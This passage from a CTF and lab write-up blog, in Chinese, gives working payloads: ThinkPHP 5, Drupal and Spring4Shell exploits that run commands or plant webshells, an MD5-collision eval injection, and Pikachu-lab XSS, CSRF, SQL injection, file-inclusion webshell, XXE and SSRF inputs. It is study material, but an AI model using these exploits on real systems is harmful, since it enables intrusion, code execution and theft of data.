&amp;&amp; isset($_GET[&#x27;b&#x27;])) &#123; if(($_GET[&#x27;a&#x27;] != $_GET[&#x27;b&#x27;]) &amp;&amp; (sha1($_GET[&#x27;a&#x27;]) == sha1($_GET[&#x27;b&#x27;])))&#123; die(&#x27;flag1: &#x27;.$flag1); &#125; else die(&#x27;a is not equal to b&#x27;);&#125;if ((string)$_GET[&#x27;Yu&#x27;] !== (string)$_GET[&#x27;lin&#x27;] &amp;&amp; (md5($_GET[&#x27;Yu&#x27;]) === md5($_GET[&#x27;lin&#x27;]))) &#123; eval($_GET[&#x27;Yu&#x27;]); //cat /flag2&#125; 第二个flag考察fastcoll，用fastcoll生成两个md5相同的字符串，由于有不可见字符，要url编码之后get传参 注意这里根据题目要求，生成文件要用system(‘cat &#x2F;flag2’);# #用于截断，eval只执行system(‘cat &#x2F;flag2’); 1234567891011121314151617181920212223242526272829303132333435363738&lt;?php function readmyfile($path)&#123; $fh = fopen($path, &quot;rb&quot;); $data = fread($fh, filesize($path)); fclose($fh); return $data;&#125;$a = urlencode(readmyfile(&quot;G:\\php\\app\\php-7.4.5-Win32-vc15-x64\\a_msg1.txt&quot;));$b = urlencode(readmyfile(&quot;G:\\php\\app\\php-7.4.5-Win32-vc15-x64\\a_msg2.txt&quot;));if(md5((string)urldecode($a))===md5((string)urldecode($b)))&#123;echo &quot;a:&quot;;echo PHP_EOL;echo $a;echo PHP_EOL;&#125;if(urldecode($a)!=urldecode($b))&#123;echo &quot;b:&quot;; echo PHP_EOL;echo $b;echo PHP_EOL;echo &quot;a url 编码的MD5:&quot;;echo PHP_EOL;echo md5(urldecode($a));echo PHP_EOL;echo &quot;a url 编码的MD5:&quot;;echo PHP_EOL;echo md5(urldecode($b));echo PHP_EOL;echo &quot;复制a url 的MD5&quot;;echo PHP_EOL;echo md5(&quot;leon%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%1FU%F8%24%DA%25Q%F8j%FE%21%F9u%3D9%88%08%11%BC9s%97%CC%E1%18%C2%80E%B0%1D%0Cw%A1%EB%FE%BD%CC%CE%1A%8C%0B%C8%F7%02%E3%F1%09o%84%A8%E6n%E0%1F%8E%7B%17l%01W%DF%FD%40eu%D9%E6f%12%AA%98Z%7F%9A%C1%2A%D9i%CB%0CE%F2X%18%8A%CD%FE%1C+%29%AF%07J%7C%F1%BD%8D_%7Bd%D4%DA%B0%87%22%1D%05%D2%99L%05%3F%CA%84%10%B1%B6%D6%C3qr%29%12m%ED%C4%D0%FB&quot;);echo PHP_EOL;echo &quot;复制b url 的MD5&quot;;echo PHP_EOL;echo md5(&quot;leon%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%1FU%F8%24%DA%25Q%F8j%FE%21%F9u%3D9%88%08%11%BC%B9s%97%CC%E1%18%C2%80E%B0%1D%0Cw%A1%EB%FE%BD%CC%CE%1A%8C%0B%C8%F7%02%E3q%0Ao%84%A8%E6n%E0%1F%8E%7B%17l%01%D7%DF%FD%40eu%D9%E6f%12%AA%98Z%7F%9A%C1%2A%D9i%CB%0CE%F2X%98%8A%CD%FE%1C+%29%AF%07J%7C%F1%BD%8D_%7Bd%D4%DA%B0%87%22%1D%05%D2%99%CC%04%3F%CA%84%10%B1%B6%D6%C3qr%29%12%ED%ED%C4%D0%FB&quot;);$code=&quot;echo 1234 ;#efsdghfgj&quot;;eval(&quot;$code&quot;);&#125; 1http://43.142.109.233:2003/?Yu=system%28%27cat+%2Fflag2%27%29%3B%23%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00f%AB%0F%AE%F7%7C%8DQ8%AA%84%A7Z%06%AD%E8%91F%DE%8DL%D5AUE%B27A%8C%06%89w%3D%BB%AD%CF%F2%28Mp%8F%F0%D5%1C%A0%C9%EAZd%DA%F7%7D%8C%05%ED4%9B%ECXE%88%2F%9F%C5%BA%E8%BAX%2F.%DD%B9%BDJ%B3%7C%96G%3C%3B%A7A%C1x8%9B1%B2%AB%C30%B8%A6_%88%A8%D7%BD%EA%E7%9F%043%FE5%40%0C4Q%F8%F9%C3%B2%EFwp%8AQv%3D%C7aq%BFV%F5%86X&amp;lin=system%28%27cat+%2Fflag2%27%29%3B%23%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00f%AB%0F%AE%F7%7C%8DQ8%AA%84%A7Z%06%AD%E8%91F%DE%0DL%D5AUE%B27A%8C%06%89w%3D%BB%AD%CF%F2%28Mp%8F%F0%D5%1C%A0I%EBZd%DA%F7%7D%8C%05%ED4%9B%ECX%C5%88%2F%9F%C5%BA%E8%BAX%2F.%DD%B9%BDJ%B3%7C%96G%3C%3B%A7A%C1%F88%9B1%B2%AB%C30%B8%A6_%88%A8%D7%BD%EA%E7%9F%043%FE5%40%0C4Qx%F9%C3%B2%EFwp%8AQv%3D%C7aq%3FV%F5%86X [EASY]Script Kiddie既然当脚本小子我就只求结果了（ thinkphp 5.01/index.php?s=/Index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami drupal123456POST /user/register?element_parents=account/mail/%23value&amp;ajax_form=1&amp;_wrapper_format=drupal_ajax HTTP/1.1Host: 121.5.35.176:30003Content-Type: application/x-www-form-urlencodedContent-Length: 173form_id=user_register_form&amp;_drupal_ajax=1&amp;mail[#post_render][]=exec&amp;mail[#type]=markup&amp;mail[#markup]=echo &quot;PD9waHAgZXZhbCgkX1JFUVVFU1RbOF0pIDs/Pg==&quot; |base64 -d |tee test.php 配合使用 1http://121.5.35.176:30003/test.php?8=system(&#x27;cat /flag&#x27;); spring1234567891011121314151617import requestsheaders=&#123; &quot;suffix&quot;: &quot;%&gt;//&quot;, &quot;c1&quot;: &quot;Runtime&quot;, &quot;c2&quot;: &quot;&lt;%&quot;&#125;payload1=&#x27;/?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%&#123;c2&#125;i if(&quot;fuck&quot;.equals(request.getParameter(&quot;pwd&quot;)))&#123; java.io.InputStream in = %&#123;c1&#125;i.getRuntime().exec(request.getParameter(&quot;cmd&quot;)).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1)&#123; out.println(new String(b)); &#125; &#125; %&#123;suffix&#125;i&amp;class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&amp;class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&amp;class.module.classLoader.resources.context.parent.pipeline.first.prefix=fuck&amp;class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=&#x27;ip=&quot;http://121.5.35.176:30004/&quot;payload2=&#x27;/fuck.jsp?pwd=fuck&amp;cmd=id&#x27;try: U1=requests.get(url=ip+payload1,headers=headers,verify=False,timeout=3) U2=requests.get(url=ip+payload2,verify=False,timeout=3) if U2.status_code == 200: print(f&quot;The VULN CVE-2022-22965 exists, payload 配合 1http://121.5.35.176:30004/fuck.jsp?pwd=fuck&amp;cmd=cat /flag 绝对音感wav拖到010editor里，最后一段发现提示： 1The interval of each byte data is 9 and the first byte is at the beginning of the wav data c写了个脚本跑出来邮件： Dear Friend ; Especially for you - this red-hot announcement! We will comply with all removal requests ! This mailis being sent in compliance with Senate bill 2116 ;Title 1 ; Section 303 ! This is NOT unsolicited bulkmail ! Why work for somebody else when you can becomerich within 81 months . Have you ever noticed nearlyevery commercial on television has a .com on in itand nearly every commercial on television has a .comon in it . Well, now is your chance to capitalize onthis ! We will help you deliver goods right to thecustomer’s doorstep and use credit cards on your website! You can begin at absolutely no cost to you . Butdon’t believe us . Ms Ames who resides in New Jerseytried us and says “Now I’m rich many more things arepossible” ! This offer is 100% legal . So make yourselfrich now by ordering immediately ! Sign up a friendand you get half off . Thanks ! Dear Salaryman ; Especiallyfor you - this amazing intelligence ! If you are notinterested in our publications and wish to be removedfrom our lists, simply do NOT respond and ignore thismail . This mail is being sent in compliance with Senatebill 2716 , Title 3 , Section 303 ! This is differentthan anything else you’ve seen . Why work for somebodyelse when you can become rich within 87 days . Haveyou ever noticed most everyone has a cellphone andsociety seems to be moving faster and faster . Well,now is your chance to capitalize on this ! WE willhelp YOU use credit cards on your website &amp; turn yourbusiness into an E-BUSINESS . You can begin at absolutelyno cost to you ! But don’t believe us ! Mr Ames ofColorado tried us and says “I’ve been poor and I’vebeen rich - rich is better” ! We are licensed to operatein all states . Do not delay - order today ! Sign upa friend and you’ll get a discount of 50% . Thank-youfor your serious consideration of our offer . 然后根据提示可以把垃圾邮件给解密 用这个网站 1https://www.spammimic.com/decode.cgi 【Mid】MidBypass提示说了有disable_function,给了一个后门 蚁剑一下，第一个flag直接送了，其他路径看不了 还有一个open basedir phpinfo先看看 搜了好多关于imagematrick的文件上传漏洞，但是现在还没搞懂写入的png怎么执行命令🥲 蚁剑插件作弊过了，以后有机会要复现一下 pikachu先部署靶场，我直接放在本地127.0.0.1了 解锁皮卡丘的密码暴力破解1.基于表单暴力破解火狐改下设置抓本地包 burp抓包爆破，爆出来密码123456 2. 基于前端的验证码绕过（on server）随便试了下密码怎么还是123456…….. 先burp抓包，然后发现一次抓包中验证码不用改 就和1一样了 3.基于前端的验证码绕过（on client）试了一下验证码是前端的，那么抓包直接去掉，和1一样 密码测出来还是123456 4.token防暴破初见还真没思路，搜索了一下 抓包pitchfork爆破密码和token 如图在extract选中token 如图填入第一个token,并选择递归搜索 成功，密码当然还是12345 XSS1.反射型xss(get)试了一堆球星，只认识科比，有点难绷。 试了下限制长度，f12改掉就行，再输入 1&lt;script&gt;alert(1)&lt;/script&gt; 成功弹窗 2.反射性xss(post)出bug了，我这题出现了登录框 搜索这题本来的样子，然后脑过吧 改成post就是post传参 1&lt;script&gt;alert(1)&lt;/script&gt; 3.存储型xss也是输入 1&lt;script&gt;alert(1)&lt;/script&gt; 4.DOM型xssf12看到提示 function domxss()&#123; var str = document.getElementById(&quot;text&quot;).value; document.getElementById(&quot;dom&quot;).innerHTML = &quot;&lt;a href=&#39;&quot;+str+&quot;&#39;&gt;what do you see?&lt;/a&gt;&quot;; &#125; //试试：&#39;&gt;&lt;img src=&quot;#&quot; onmouseover=&quot;alert(&#39;xss&#39;)&quot;&gt; //试试：&#39; onclick=&quot;alert(&#39;xss&#39;)&quot;&gt;,闭合掉就行 输入 1&#x27; onclick=&quot;alert(&#x27;leon&#x27;)&quot;&gt; 原理就是提前闭合，让href的属性为onclick 5.xss盲打上下两个框都填上 1&lt;script&gt;alert(1)&lt;/script&gt; 然后根据提示登录留言板后台，就弹窗了 6.xss之过滤过滤script,大小写绕过 7.xss之htmlspecialcharsspecialchars函数会把单双引号和尖括号都转义了，但是试了一下这里没过滤单引号 playload: 1&#x27; onclick=&#x27;alert(1) 8.xss之href输出过滤单双引号，用伪协议绕过 1javascript:alert(1) 9.xss之js输出提前闭合第一个script 1’&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt; CSRF1.CSRF(get) login抓包修改个人信息，用burp生成csrf poc: 1234567891011121314&lt;html&gt; &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt; &lt;body&gt; &lt;script&gt;history.pushState(&#x27;&#x27;, &#x27;&#x27;, &#x27;/&#x27;)&lt;/script&gt; &lt;form action=&quot;http://127.0.0.1/pikachu/vul/csrf/csrfget/csrf_get_edit.php&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;sex&quot; value=&quot;hacker&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;phonenum&quot; value=&quot;hacker&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;add&quot; value=&quot;hacker&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;hacker&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;submit&quot; value=&quot;submit&quot; /&gt; &lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt; &lt;/form&gt; &lt;/body&gt;&lt;/html&gt; 打开链接：http://burp/show/4/2etstzgrlo1eqv1ef15ihs9u0bxp6ybb 发现成功修改（kobe账户需处于登录状态） 2.CSRF(post)改成post传参，其他和1相同，不多赘述 3.CSRF Token遇到token还是不会 搜了一下要用到burp的CSRF Token Tracker插件 添加如图的规则 然后生成poc SQL-Inject1.数字型注入抓包，直接放playload吧 1234567id=-1 union select database(),2//爆库名id=-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()//爆表名id=-1 union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;//爆列名id=-1 union select username,password from users//爆账号密码 爆出来了 2.字符型注入注意闭合，其他和1一样 playload: 11’union select username,password from users# 3.搜索型注入只是多了一列 playload: 11&#x27;union select username,password,1 from pikachu.users# 4. XX型注入用 ‘) 来闭合 playlaod: 11&#x27;)union selct username,password from users # 5. insert&#x2F;update注入没有回显，使用报错注入 playload: 12345671&#x27; and extractvalue(1,concat(0x7e,(database()))) and &#x27;1&#x27;=&#x27;1 1&#x27; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#x27;pikachu&#x27; limit 0,1)),0) and &#x27;1&#x27;=&#x27;11&#x27; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1)),0) and &#x27;1&#x27;=&#x27;11&#x27; and updatexml(1,concat(0x7e,(select id from users limit 0,1)),0) and &#x27;1&#x27;=&#x27;1 6.Delete注入还挺新颖的，留言板无法注入，随便输入，然后删除，抓包 抓包发现get传了一个id，那么利用id注入，还是用报错注入 注意： 一些关键字如#，空格需要进行URL格式转换 7.http头注入根据提示登录抓包，用user-agent进行注入 playlaod: 1&#x27; or updatexml(1,concat(0x7e,substr((select group_concat(concat(username,&#x27;^&#x27;,password)) from users),1,31),0x7e),1) or &#x27; 8.布尔盲注上python脚本吧，把做sql的题目的脚本捡起来改改 脚本就是方便啊 9.延时盲注把上面的脚本改改，延时耗时太长了，不赘述了 10. 宽字节注入lili%df’ or 1&#x3D;2 继续改布尔盲注的脚本吧 RCE1.exec “ping”playload: 1ping 127.0.0.1 |whoami 2.exec “eval”playload: 1phpinfo(); File Inclusion1.本地文件包含图片路径可修改，改为..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;windows&#x2F;win.ini 成功查win.ini文件，那么我们在本地写一个木马，就能通过这种方式用蚁剑连接了 2.远程文件包含创建一个shell.txt: 1&lt;?php fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_POST[leon]) ?&gt; &#x27; ); ?&gt; playload: 1http://127.0.0.1/pikachu/vul/fileinclude/fi_remote.php?filename=G:\\phpstudy_pro\\WWW\\pikachu\\vul\\fileinclude\\shell.txt&amp;submit=%E6%8F%90%E4%BA%A4 成功生成shell.php，蚁剑连接 不安全的文件下载1.不安全的文件下载想找科比的路径，看到了有意思的东西 修改路径 点击成功下载 Unsafe file upload1.客户端check这里抓包改后缀或者浏览器关闭js都可以，我选择后者 2.服务端check这里直接抓包改后缀就行 3.getimagesize()大小不对的图片会被打回来，先在正常图片中插入一句话木马，但不会执行php语句，只能结合上上关的文件包含漏洞 playload: 1http://127.0.0.1/pikachu/vul/fileinclude/fi_local.php?filename=../../unsafeupload/uploads/shell.php&amp;submit=%E6%8F%90%E4%BA%A4 Over permission1.水平越权 在url这里把username改成别的用户 2.垂直越权登录admin账户，点击添加账户，并且记住url: 1http://127.0.0.1/pikachu/vul/overpermission/op2/op2_admin_edit.php 登录普通pikachu账户，然后直接复制上面的链接进行添加账户，再登录admin账户，发现成功添加，那么就存在垂直越权。 ..&#x2F;..&#x2F;1.目录遍历playload: 1http://127.0.0.1/pikachu/vul/dir/dir_list.php?title=../../../../../../Windows/win.ini 敏感信息泄露1.find abc f12找到账户 黄金时代👍我也很喜欢这一段 可以直接修改url得到敏感信息 PHP反序列化1.PHP反序列化漏洞没找到反序列化的代码，试了一下给的playload: 1O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:29:&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;;&#125; 发现可以 XXE1.XXE漏洞playload: 1234&lt;?xml version=&quot;1.0&quot;?&gt; &lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &quot;file:///c:/windows/win.ini&quot; &gt; ]&gt; &lt;foo&gt;&amp;xxe;&lt;/foo&gt; url重定向1.不安全的url跳转 如图修改，点击则跳转百度 SSRF1.SSRF(curl)playload: 1http://127.0.0.1/pikachu/vul/ssrf/ssrf_curl.php?url=file:///c:/Windows/win.ini 2.SSRF(file_get_content)playload: 1http://127.0.0.1/pikachu/vul/ssrf/ssrf_fgc.php?file=file:///c:/windows/win.ini","categories":[{"name":"writeup","slug":"writeup","permalink":"https://foreon.github.io/categories/writeup/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://foreon.github.io/tags/ctf/"}]},{"title":"我的第一篇博客","slug":"first blog","date":"2023-11-02T12:15:27.000Z","updated":"2023-11-03T15:41:37.813Z","comments":true,"path":"posts/51727.html","link":"","permalink":"https://foreon.github.io/posts/51727.html","excerpt":"","text":"我开始写博客了！此博客诞生于2023年11月2日。 今后我应该会更新一些随笔、ctf比赛writeup和学习总结。","categories":[{"name":"随笔","slug":"随笔","permalink":"https://foreon.github.io/categories/%E9%9A%8F%E7%AC%94/"}],"tags":[{"name":"打招呼","slug":"打招呼","permalink":"https://foreon.github.io/tags/%E6%89%93%E6%8B%9B%E5%91%BC/"}]}],"categories":[{"name":"专业课学习笔记","slug":"专业课学习笔记","permalink":"https://foreon.github.io/categories/%E4%B8%93%E4%B8%9A%E8%AF%BE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"Learning record","slug":"Learning-record","permalink":"https://foreon.github.io/categories/Learning-record/"},{"name":"writeup","slug":"writeup","permalink":"https://foreon.github.io/categories/writeup/"},{"name":"随笔","slug":"随笔","permalink":"https://foreon.github.io/categories/%E9%9A%8F%E7%AC%94/"}],"tags":[{"name":"大学课程学习","slug":"大学课程学习","permalink":"https://foreon.github.io/tags/%E5%A4%A7%E5%AD%A6%E8%AF%BE%E7%A8%8B%E5%AD%A6%E4%B9%A0/"},{"name":"linux","slug":"linux","permalink":"https://foreon.github.io/tags/linux/"},{"name":"ctf","slug":"ctf","permalink":"https://foreon.github.io/tags/ctf/"},{"name":"打招呼","slug":"打招呼","permalink":"https://foreon.github.io/tags/%E6%89%93%E6%8B%9B%E5%91%BC/"}]}